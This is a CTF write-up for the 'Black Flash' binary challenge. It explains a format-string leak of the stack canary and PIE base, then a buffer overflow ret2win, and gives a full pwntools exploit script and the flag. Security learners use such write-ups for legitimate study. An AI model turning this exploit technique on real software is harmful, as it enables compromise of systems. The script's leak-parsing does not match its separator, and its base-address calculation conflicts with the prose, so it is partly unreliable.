# Black Flash

**Category:** Binary Exploitation
**Flag:** `UMCS{wh7_bl4ck_fl45h_15_120_p3rc3nt?}`

## Challenge Overview

![Challenge Description](BlackFlash.png)

> *"Mei Mei has been lured into the Smallpox Deity's Domain Expansion! She is currently sealed inside a heavy stone coffin, and the countdown to her burial has begun… Help Mei Mei perform a Black Flash to shatter the coffin."*

Files: `black_flash` (binary), `libc.so.6`, `ld-linux-x86-64.so.2`.

## Initial Enumeration / Recon

```bash
checksec --file=black_flash
# RELRO: Partial   STACK CANARY: Found   NX: Enabled   PIE: Enabled

objdump -t black_flash | grep win
# 0000000000001261 g F .text  00000000000000cb   win
```

There's a `win()` function — the goal is to redirect execution there.

Looking at `vuln()`, two bugs stand out:

1. **Format string vulnerability:** `printf(buf)` with no format argument.
2. **Buffer overflow:** `fgets()` reads 256 bytes into a 128-byte stack buffer.

## Vulnerability Analysis

Because PIE is enabled, `win()`'s address is unknown at runtime. We also need to leak the stack canary before overflowing.

The format string bug gives us both for free:

- `%21$p` leaks the **stack canary**.
- `%23$p` leaks the **return address to main**, letting us calculate the ELF base:

```
elf_base = leaked_main_ret - 0x1548
win_addr = elf_base + elf.sym['win']
```

## Exploitation Steps

```python
from pwn import *

context.log_level = "info"
context.arch      = "amd64"

elf = ELF("./black_flash")
p   = remote("chal.umcybersec.site", 10228)

# Stage 1: leak canary and ELF base via format string
p.recvuntil(b"feeling......: ")
p.sendline(b"%21$p|%23$p")

p.recvuntil(b"want.......: ")
leak_line = p.recvline().split(b"Now, you reach the core of the spark......: ")[1].strip()
canary_s, main_s = leak_line.split(b".")
canary    = int(canary_s, 16)
main_leak = int(main_s, 16)

elf.address = main_leak - elf.sym.main
win         = elf.sym.win

log.info(f"canary  = {hex(canary)}")
log.info(f"ELF base = {hex(elf.address)}")
log.info(f"win      = {hex(win)}")

# Stage 2: overflow with canary intact, ret2win
rop     = ROP(elf)
payload = flat(
    b"A" * 0x78,
    canary,
    b"B" * 8,          # saved RBP
    rop.ret.address,   # stack alignment gadget for SSE
    win,
)

p.recvuntil(b"spark......: ")
p.sendline(payload)
p.interactive()
```

## Flag

```
UMCS{wh7_bl4ck_fl45h_15_120_p3rc3nt?}
```

Format string vulnerabilities are both information-disclosure bugs and write primitives. This challenge only needed the read side. Stack alignment for SSE operations (`movaps` segfaults on an unaligned stack) trips up many ret2win exploits — always add a `ret` gadget before calling functions that use floating-point instructions.
